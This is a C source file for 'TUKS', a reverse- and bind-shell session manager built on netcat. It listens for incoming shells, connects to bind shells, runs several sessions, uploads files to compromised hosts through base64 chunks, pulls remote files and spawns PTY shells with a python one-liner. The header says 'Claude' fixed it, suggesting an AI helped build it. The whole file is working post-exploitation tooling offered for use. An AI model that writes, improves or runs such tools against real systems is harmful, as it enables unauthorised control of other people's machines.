/**
 * TUKS - The Ultimate Kill Shell Manager (Fixed Version)
 *
 * This tool manages bind and reverse shell sessions using netcat (nc).
 * Features:
 *   - Listen for reverse shells
 *   - Connect to bind shells
 *   - Manage multiple sessions (list, kill, use, background)
 *   - Upload files via base64 chunks
 *
 * Compile: gcc -o tuks tuks.c
 * Usage: ./tuks
 *
 * Author: Moak (Fixed by Claude)
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/wait.h>
 #include <signal.h>
 #include <fcntl.h>
 #include <time.h>
 #include <errno.h>
 
 #define VERSION "0.3 Beta"
 #define AUTHOR "Moak"
 #define YEAR "2025"
 
 #define MAX_SESSIONS 20
 #define BUFFER_SIZE 4096
 
 struct Session {
     int id;
     pid_t pid;
     char desc[128];
     char hostname[128];
     int active;
     int in_pipe[2];   // Pipe for sending commands to nc
     int out_pipe[2];  // Pipe for reading output from nc
 };
  
 struct Session sessions[MAX_SESSIONS];
 int session_count = 0;
 
 /* ================== BASE64 ENCODER ================== */
 static const char b64_table[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 char *base64_encode(const unsigned char *src, size_t len, size_t *out_len) {
     char *out, *pos;
     const unsigned char *end, *in;
     size_t olen;
 
     olen = 4 * ((len + 2) / 3);
     if (olen < len) return NULL;
 
     out = malloc(olen + 1);
     if (!out) return NULL;
 
     end = src + len;
     in = src;
     pos = out;
 
     while (end - in >= 3) {
         *pos++ = b64_table[in[0] >> 2];
         *pos++ = b64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
         *pos++ = b64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
         *pos++ = b64_table[in[2] & 0x3f];
         in += 3;
     }
 
     if (end - in) {
         *pos++ = b64_table[in[0] >> 2];
         if (end - in == 1) {
             *pos++ = b64_table[(in[0] & 0x03) << 4];
             *pos++ = '=';
         } else {
             *pos++ = b64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
             *pos++ = b64_table[(in[1] & 0x0f) << 2];
         }
         *pos++ = '=';
     }
 
     *pos = '\0';
     if (out_len) *out_len = pos - out;
     return out;
 }
 
 /* ================== BANNER ================== */
 void print_banner() {
     time_t now = time(NULL);
     struct tm *tm_struct = localtime(&now);
     char datetime[64];
     strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", tm_struct);
 
     printf("\033[1;31m");
     printf("████████╗██╗   ██╗██╗  ██╗███████╗\n");
     printf("╚══██╔══╝██║   ██║██║ ██╔╝██╔════╝\n");
     printf("   ██║   ██║   ██║█████╔╝ ███████╗\n");
     printf("   ██║   ██║   ██║██╔═██╗ ╚════██║\n");
     printf("   ██║   ╚██████╔╝██║  ██╗███████║\n");
     printf("   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝\n");
 
     printf("\033[1;34m");
     printf("═══════════════════════════════════\n");
 
     printf("\033[1;37m");
     printf("  The Ultimate Kill Shell Manager\n");
 
     printf("\033[1;34m");
     printf("═══════════════════════════════════\n");
 
     printf("\033[0;36m");
     printf("Version: %s\n", VERSION);
     printf("Author : %s\n", AUTHOR);
     printf("Created In: %s\n", YEAR);
 
     printf("\033[1;33m");
     printf("\nCommands:\n");
     printf("  listen <port>          - Start a reverse shell listener\n");
     printf("  connect <ip> <port>    - Connect to a bind shell\n");
     printf("  list                   - List all sessions\n");
     printf("  use <id>               - Interact with a session\n");
     printf("  kill <id>              - Terminate a session\n");
     printf("  upload <id> <local> <remote> - Upload file\n");
     printf("  upgrade <id>           - Upgrade interactive shell (auto pty)\n");
     printf("  shell <id>             - Get interactive shell (auto pty)\n");
     printf("  help                   - Command menu\n");
     printf("  clear                  - Clear screen\n");
     printf("  exit                   - Exit TUKS\n");
 
     printf("\033[1;34m");
     printf("═══════════════════════════════════\n");
     printf("\033[0m");
     fflush(stdout);
 }
 
 // HELP
 void print_help(){
     printf("\033[1;33m");
     printf("\nCommands:\n");
     printf("  listen <port>          - Start a reverse shell listener\n");
     printf("  connect <ip> <port>    - Connect to a bind shell\n");
     printf("  list                   - List all sessions\n");
     printf("  use <id>               - Interact with a session\n");
     printf("  kill <id>              - Terminate a session\n");
     printf("  upload <id> <local> <remote> - Upload file\n");
     printf("  upgrade <id>           - Upgrade interactive shell (auto pty)\n");
     printf("  help                   - Command menu\n");
     printf("  clear                  - Clear screen\n");
     printf("  exit                   - Exit TUKS\n");
     printf("\033[0m");
 }
 
 /* ================== SESSION MANAGEMENT ================== */
 void add_session(pid_t pid, const char *desc, int in_pipe[], int out_pipe[]) {
     if (session_count >= MAX_SESSIONS) {
         printf("[!] Session limit reached\n");
         return;
     }
     
     // Make output pipe non-blocking
     int flags = fcntl(out_pipe[0], F_GETFL, 0);
     fcntl(out_pipe[0], F_SETFL, flags | O_NONBLOCK);
     
     sessions[session_count].id = session_count + 1;
     sessions[session_count].pid = pid;
     strncpy(sessions[session_count].desc, desc, sizeof(sessions[session_count].desc) - 1);
     sessions[session_count].desc[sizeof(sessions[session_count].desc) - 1] = '\0';
     sessions[session_count].active = 0;
 
     sessions[session_count].in_pipe[0] = in_pipe[0];
     sessions[session_count].in_pipe[1] = in_pipe[1];
     sessions[session_count].out_pipe[0] = out_pipe[0];
     sessions[session_count].out_pipe[1] = out_pipe[1];
 
     session_count++;
 }
 
 void list_sessions() {
     if (session_count == 0) {
         printf("[*] No active sessions\n");
         return;
     }
     printf("\033[1;36m");
     printf("ID  PID      STATUS      DESCRIPTION\n");
     printf("--- -------- ----------- -----------\n");
     printf("\033[0m");
     for (int i = 0; i < session_count; i++) {
         printf("%-3d %-8d %-11s %s\n", 
                sessions[i].id, 
                sessions[i].pid,
                sessions[i].active ? "active" : "background",
                sessions[i].desc);
     }
 }
 
 void kill_session(int id) {
     for (int i = 0; i < session_count; i++) {
         if (sessions[i].id == id) {
             kill(sessions[i].pid, SIGTERM);
             waitpid(sessions[i].pid, NULL, 0);
 
             close(sessions[i].in_pipe[0]);
             close(sessions[i].in_pipe[1]);
             close(sessions[i].out_pipe[0]);
             close(sessions[i].out_pipe[1]);
 
             printf("[*] Session %d killed\n", id);
 
             for (int j = i; j < session_count - 1; j++) {
                 sessions[j] = sessions[j + 1];
             }
             session_count--;
             return;
         }
     }
     printf("[!] Invalid session ID\n");
 }
 
 /* ================== IMPROVED OUTPUT DRAINING ================== */
 int drain_output(int session_idx) {
     char buffer[BUFFER_SIZE];
     int total_bytes = 0;
     
     while (1) {
         int bytes_read = read(sessions[session_idx].out_pipe[0], buffer, BUFFER_SIZE - 1);
         if (bytes_read > 0) {
             buffer[bytes_read] = '\0';
             printf("%s", buffer);
             fflush(stdout);
             total_bytes += bytes_read;
         } else if (bytes_read == 0) {
             // EOF - session closed
             return -1;
         } else {
             // EAGAIN/EWOULDBLOCK or other error
             if (errno == EAGAIN || errno == EWOULDBLOCK) {
                 break; // No more data available
             } else {
                 perror("read");
                 return -1;
             }
         }
     }
     return total_bytes;
 }
 
 
  /* ================== UPLOAD FILE ================== */
  void upload_file(int id, const char *local_path, const char *remote_name) {
    if (id <= 0 || id > session_count) {
        printf("[!] Invalid session ID\n");
        return;
    }

    FILE *fp = fopen(local_path, "rb");
    if (!fp) {
        perror("fopen");
        return;
    }

    unsigned char buffer[512];
    size_t n;
    char command[BUFFER_SIZE];

    snprintf(command, sizeof(command), "rm -f uplaodtmp.tuks\n");
    write(sessions[id - 1].in_pipe[1], command, strlen(command));

    while ((n = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        size_t out_len;
        char *encoded = base64_encode(buffer, n, &out_len);
        if (!encoded) {
            printf("[!] base64_encode failed\n");
            fclose(fp);
            return;
        }

        snprintf(command, sizeof(command), "echo \"%s\" >> uplaodtmp.tuks\n",
                 encoded);
        write(sessions[id - 1].in_pipe[1], command, strlen(command));
        free(encoded);
    }

    fclose(fp);

    snprintf(command, sizeof(command),
             "cat uplaodtmp.tuks | base64 -d > %s\n", remote_name);
    write(sessions[id - 1].in_pipe[1], command, strlen(command));

    printf("[*] File %s uploaded to session %d as %s\n", local_path, id,
           remote_name);
}

 
 void download_file(int id, const char *remote_path, const char *local_name) {
     if (id <= 0 || id > session_count) {
         printf("[!] Invalid session ID\n");
         return;
     }
 
     char command[BUFFER_SIZE];
     
     printf("[*] Starting download of %s...\n", remote_path);
     
     // Send command to base64 encode the remote file
     snprintf(command, sizeof(command), "base64 '%s' 2>/dev/null || echo 'FILE_NOT_FOUND'\n", remote_path);
     write(sessions[id - 1].in_pipe[1], command, strlen(command));
     
     printf("[*] Download command sent. Check session output for base64 data.\n");
     printf("[*] You can manually decode with: base64 -d > %s\n", local_name);
 }
 
 /* ================== AUTO PTY SHELL ================== */
 void upgrade(int id) {
     if (id <= 0 || id > session_count) {
         printf("[!] Invalid session ID\n");
         return;
     }
 
     char command[BUFFER_SIZE];
     
     printf("[*] Attempting to spawn interactive shell on session %d...\n", id);
     
     // Try multiple methods to get a proper PTY
     snprintf(command, sizeof(command), 
              "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || "
              "python -c 'import pty; pty.spawn(\"/bin/bash\")' || "
              "script -qc /bin/bash /dev/null || "
              "/bin/bash\n");
     
     write(sessions[id - 1].in_pipe[1], command, strlen(command));
     
     // Try to set up proper terminal
     snprintf(command, sizeof(command), "export TERM=xterm\n");
     write(sessions[id - 1].in_pipe[1], command, strlen(command));
     
     printf("[*] Interactive shell commands sent. Use 'use %d' to interact.\n", id);
 }
 

 
 /* Remove a session at index idx (0-based). Closes pipes and reindexes array. */
 void remove_session_at_index(int idx) {
     if (idx < 0 || idx >= session_count) return;
 
     // Try to terminate child if still running
     if (sessions[idx].pid > 0) {
         kill(sessions[idx].pid, SIGTERM);
         waitpid(sessions[idx].pid, NULL, WNOHANG);
     }
 
     // Close pipes (ignore errors)
     if (sessions[idx].in_pipe[0] > 0) close(sessions[idx].in_pipe[0]);
     if (sessions[idx].in_pipe[1] > 0) close(sessions[idx].in_pipe[1]);
     if (sessions[idx].out_pipe[0] > 0) close(sessions[idx].out_pipe[0]);
     if (sessions[idx].out_pipe[1] > 0) close(sessions[idx].out_pipe[1]);
 
     // Shift array left
     for (int j = idx; j < session_count - 1; j++) {
         sessions[j] = sessions[j + 1];
     }
     session_count--;
 }
 
 /* Poll all sessions to see whether their child exited (non-blocking). */
 void check_sessions() {
     for (int i = 0; i < session_count; /* increment inside */) {
         pid_t pid = sessions[i].pid;
         if (pid <= 0) { i++; continue; }
 
         int status = 0;
         pid_t w = waitpid(pid, &status, WNOHANG);
         if (w == 0) {
             // child still running
             i++;
             continue;
         } else if (w == pid) {
             // child exited
             printf("\n[*] Session %d (PID %d) terminated.\n", sessions[i].id, pid);
             remove_session_at_index(i);
             // Do not increment i — array shifted, current i is next element
         } else {
             // waitpid error (ECHILD or other) - remove conservative
             if (errno != ECHILD) {
                 perror("waitpid");
             }
             remove_session_at_index(i);
         }
     }
 }
 
 /* ================== IMPROVED INTERACT SESSION ================== */
 void interact_session(int id) {
     int session_idx = -1;
     
     // Find session
     for (int i = 0; i < session_count; i++) {
         if (sessions[i].id == id) {
             session_idx = i;
             break;
         }
     }
     
     if (session_idx == -1) {
         printf("[!] Invalid session ID\n");
         return;
     }
 
     printf("[*] Interacting with session %d (type 'tuksB' to background)\n", id);
     sessions[session_idx].active = 1;

     char input[BUFFER_SIZE];
     fd_set readfds;
     int max_fd;
 
     // Initial drain of any pending output
     drain_output(session_idx);

     while (1) {
         //printf("TUKSession %d> ", id);
         
         fflush(stdout);
        
         // Use select to monitor both stdin and session output
         FD_ZERO(&readfds);
         FD_SET(STDIN_FILENO, &readfds);
         FD_SET(sessions[session_idx].out_pipe[0], &readfds);
         
         max_fd = (sessions[session_idx].out_pipe[0] > STDIN_FILENO) ? 
                  sessions[session_idx].out_pipe[0] : STDIN_FILENO;
 
         int ready = select(max_fd + 1, &readfds, NULL, NULL, NULL);
         
         if (ready < 0) {
             if (errno == EINTR) continue;
             perror("select");
             break;
         }
        

         // Check for output from session
         if (FD_ISSET(sessions[session_idx].out_pipe[0], &readfds)) {
             int result = drain_output(session_idx);
             if (result < 0) {
                 printf("\n[*] Session %d closed.\n", id);
                 remove_session_at_index(session_idx);
                 return;
             }
         }
 
         // Check for input from user
         if (FD_ISSET(STDIN_FILENO, &readfds)) {
             if (!fgets(input, sizeof(input), stdin)) {
                 printf("\n[*] Input closed. Returning to main menu.\n");
                 sessions[session_idx].active = 0;
                 return;
             }
 
             // Remove newline
             input[strcspn(input, "\n")] = 0;
 
             if (strcmp(input, "tuksB") == 0) {
                 printf("[*] Session %d sent to background\n", id);
                 sessions[session_idx].active = 0;
                 return;
             }
 
             // Send command
             strcat(input, "\n");
             if (write(sessions[session_idx].in_pipe[1], input, strlen(input)) < 0) {
                 perror("write");
                 printf("[*] Failed to write to session %d. Removing.\n", id);
                 remove_session_at_index(session_idx);
                 return;
             }
 
             // Give a moment for output, then drain
             usleep(50000); // 50ms
             drain_output(session_idx);
         }
     }
     
     sessions[session_idx].active = 0;
 }
 
 /* ================== LISTENER/CONNECT ================== */
 void start_listener(const char *port) {
     int in_pipe[2];
     int out_pipe[2];
 
     if (pipe(in_pipe) < 0 || pipe(out_pipe) < 0) {
         perror("pipe");
         return;
     }
 
     pid_t pid = fork();
     if (pid == 0) {
         dup2(in_pipe[0], STDIN_FILENO);
         dup2(out_pipe[1], STDOUT_FILENO);
         dup2(out_pipe[1], STDERR_FILENO);
 
         close(in_pipe[1]);
         close(out_pipe[0]);
 
         execlp("nc", "nc", "-lnp", port, NULL);
         perror("execlp");
         exit(1);
     } else if (pid > 0) {
         close(in_pipe[0]);
         close(out_pipe[1]);
 
         char desc[128];
         snprintf(desc, sizeof(desc), "Listening on port %s", port);
         add_session(pid, desc, in_pipe, out_pipe);
         printf("[*] Listener started on port %s [session %d]\n", port, session_count);
     } else {
         perror("fork");
     }
 }
 
 void connect_target(const char *ip, const char *port) {
     int in_pipe[2];
     int out_pipe[2];
 
     if (pipe(in_pipe) < 0 || pipe(out_pipe) < 0) {
         perror("pipe");
         return;
     }
 
     pid_t pid = fork();
     if (pid == 0) {
         dup2(in_pipe[0], STDIN_FILENO);
         dup2(out_pipe[1], STDOUT_FILENO);
         dup2(out_pipe[1], STDERR_FILENO);
 
         close(in_pipe[1]);
         close(out_pipe[0]);
 
         execlp("nc", "nc", ip, port, NULL);
         perror("execlp");
         exit(1);
     } else if (pid > 0) {
         close(in_pipe[0]);
         close(out_pipe[1]);
 
         char desc[128];
         snprintf(desc, sizeof(desc), "Connected to %s:%s", ip, port);
         add_session(pid, desc, in_pipe, out_pipe);
         printf("[*] Connected to %s:%s [session %d]\n", ip, port, session_count);
     } else {
         perror("fork");
     }
 }
 
 static void ensure_rlwrap(int argc, char **argv) {
    /* If already wrapped (or user forced skip) -> do nothing */
    if (getenv("TUKS_RLWRAPPED") != NULL) return;

    /* Build new argv: {"rlwrap", argv[0], argv[1], ..., NULL} */
    char **newargv = malloc((argc + 2) * sizeof(char *));
    if (!newargv) return;

    newargv[0] = "rlwrap";
    for (int i = 0; i < argc; ++i) {
        newargv[i + 1] = argv[i];
    }
    newargv[argc + 1] = NULL;

    /* Mark environment so the child won't try to re-wrap again */
    if (setenv("TUKS_RLWRAPPED", "1", 1) != 0) {
        free(newargv);
        return;
    }

    /* Replace current process with: rlwrap original-argv... */
    execvp("rlwrap", newargv);

    /* If execvp returns, it failed. Clean up and continue without rlwrap. */
    int saved_errno = errno;
    unsetenv("TUKS_RLWRAPPED");
    free(newargv);

    /* If rlwrap is simply not installed, silently continue.
       Otherwise print a diagnostic (optional). */
    if (saved_errno != ENOENT && saved_errno != ENOEXEC && saved_errno != ENOTDIR) {
        perror("execvp(rlwrap)");
    }
    /* return to main and continue without rlwrap */
}


 /* ================== MAIN LOOP ================== */
 int main(int argc, char **argv) {
    /* Try to auto-wrap with rlwrap (will exec and not return if successful) */
     ensure_rlwrap(argc, argv);
     char input[256];
 
     system("clear");
     print_banner();
     
     // Handle CTRL+Z and CTRL+C
 
     while (1) {
         // Check sessions each loop
         check_sessions();
 
         printf("\033[1;32mtuks>\033[0m ");
         fflush(stdout);
 
         if (!fgets(input, sizeof(input), stdin)) break;
         input[strcspn(input, "\n")] = 0;
 
         if (strncmp(input, "listen", 6) == 0) {
             char port[16];
             if (sscanf(input, "listen %15s", port) == 1) {
                 start_listener(port);
             } else {
                 printf("Usage: listen <port>\n");
             }
         } else if (strncmp(input, "connect", 7) == 0) {
             char ip[64], port[16];
             if (sscanf(input, "connect %63s %15s", ip, port) == 2) {
                 connect_target(ip, port);
             } else {
                 printf("Usage: connect <ip> <port>\n");
             }
         } else if (strcmp(input, "list") == 0) {
             list_sessions();
         } else if (strcmp(input, "help") == 0) {
             print_help();
         } else if (strcmp(input, "clear") == 0) {
             system("clear");
         } else if (strncmp(input, "kill", 4) == 0) {
             int id;
             if (sscanf(input, "kill %d", &id) == 1) {
                 kill_session(id);
             } else {
                 printf("Usage: kill <id>\n");
             }
         } else if (strncmp(input, "use", 3) == 0) {
             int id;
             if (sscanf(input, "use %d", &id) == 1) {
                 interact_session(id);
             } else {
                 printf("Usage: use <id>\n");
             }
         } else if (strncmp(input, "upload", 6) == 0) {
             int id;
             char local[128], remote[128];
             if (sscanf(input, "upload %d %127s %127s", &id, local, remote) == 3) {
                 upload_file(id, local, remote);
             } else {
                 printf("Usage: upload <id> <localfile> <remotefile>\n");
             }
         } else if (strncmp(input, "download", 8) == 0) {
             int id;
             char remote[128], local[128];
             if (sscanf(input, "download %d %127s %127s", &id, remote, local) == 3) {
                 download_file(id, remote, local);
             } else {
                 printf("Usage: download <id> <remotefile> <localfile>\n");
             }
         } else if (strncmp(input, "upgrade", 7) == 0) {
             int id;
             if (sscanf(input, "upgrade %d", &id) == 1) {
                 upgrade(id);
             } else {
                 printf("Usage: shell <id>\n");
             }
         } else if (strcmp(input, "exit") == 0 || strcmp(input, "quit") == 0) {
             printf("[*] Cleaning up sessions...\n");
             for (int i = 0; i < session_count; i++) {
                 kill(sessions[i].pid, SIGTERM);
                 waitpid(sessions[i].pid, NULL, WNOHANG);
             }
             printf("[*] Exiting...\n");
             break;
         } else if (strlen(input) > 0) {
             printf("[!] Unknown command: %s\n", input);
             printf("[!] Use \"help\" to print command menu.\n\n");
         }
     }
     return 0;
 }